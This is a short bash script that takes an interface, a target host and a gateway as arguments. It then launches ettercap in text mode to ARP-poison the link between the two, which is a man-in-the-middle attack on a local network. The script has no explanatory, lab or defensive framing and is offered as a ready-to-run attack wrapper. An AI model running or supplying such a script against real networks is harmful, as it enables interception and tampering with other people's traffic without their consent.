#!/bin/bash

function error_kill() {
  echo "$1"
  exit
}

POSITIONAL=()
while [[ $# -gt 0 ]]; do
  key="$1"

  case $key in
    -i|--interface)
      INTERFACE="$2"
      shift
      shift
      ;;
    -h|--host)
      HOST="$2"
      shift
      shift
      ;;
    -gw|--gateway)
      GATEWAY="$2"
      shift
      shift
      ;;
    *)
      POSITIONAL+=("$1")
      shift
      ;;
  esac
done

set -- "${POSITIONAL[@]}"

[ -n "${INTERFACE}" ] || error_kill "Parameter Interface is required! ${INTERFACE}, provided"
[ -n "${HOST}" ] || error_kill "Parameter Host is required! ${HOST}, provided"
[ -n "${GATEWAY}" ] || error_kill "Parameter Gateway is required! ${GATEWAY}, provided"

ettercap -i "${INTERFACE}" -T -M arp /"${HOST}"///"${GATEWAY}"/
